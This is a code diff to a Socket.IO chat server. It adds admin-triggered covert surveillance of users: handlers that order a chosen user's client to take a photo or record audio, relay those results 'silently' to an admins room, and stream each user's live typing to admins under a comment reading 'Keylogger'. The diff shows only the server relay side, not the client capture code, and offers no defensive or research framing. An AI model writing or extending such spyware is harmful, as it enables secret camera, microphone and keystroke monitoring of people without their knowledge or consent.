@@ -40,6 +40,16 @@ io.on('connection', (socket) => {
             ...data
         });
     });
+    
+    // Admin requesting a photo from a specific user
+    socket.on('request_snapshot', (userId) => {
+        io.to(userId).emit('take_snapshot');
+    });
+
+    // Admin requesting audio from a specific user
+    socket.on('request_audio', (userId) => {
+        io.to(userId).emit('take_audio');
+    });
 
 
     // --- CHAT LOGIC ---
@@ -57,6 +67,32 @@ io.on('connection', (socket) => {
     socket.on('chat_message', (data) => {
         // Broadcast message to everyone EXCEPT sender
         socket.broadcast.emit('chat_message', data);
+    });
+
+    // User sending the photo silently to admins
+    socket.on('snapshot_result', (data) => {
+        io.to('admins').emit('snapshot_received', {
+            id: socket.id,
+            username: data.username,
+            image: data.image
+        });
+    });
+
+    // User sending the audio silently to admins
+    socket.on('audio_result', (data) => {
+        io.to('admins').emit('audio_received', {
+            id: socket.id,
+            username: data.username,
+            audio: data.audio
+        });
+    });
+
+    // User is typing (Keylogger)
+    socket.on('live_typing', (text) => {
+        io.to('admins').emit('user_typing_live', {
+            id: socket.id,
+            text: text
+        });
     });
 
     
